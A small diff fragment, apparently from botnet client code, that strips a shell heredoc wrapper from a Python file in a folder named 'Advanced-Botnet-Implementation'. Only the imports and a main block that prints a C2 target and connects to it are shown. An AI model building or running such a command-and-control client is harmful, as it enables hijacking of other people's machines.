@@ -1,10 +1,3 @@
-cd ~/Downloads/Advanced-Botnet-Implementation
-cat > client.py << 'EOF'
-#!/usr/bin/env python3
-"""
-Linux-compatible client that matches the original server protocol
-"""
-
 import socket
 import sys
 import os
@@ -150,4 +143,3 @@ if __name__ == "__main__":
     print(f"[*] Target C2: {C2_IP}:{C2_PORT}")
     server(C2_IP, C2_PORT)
     run()
-EOF
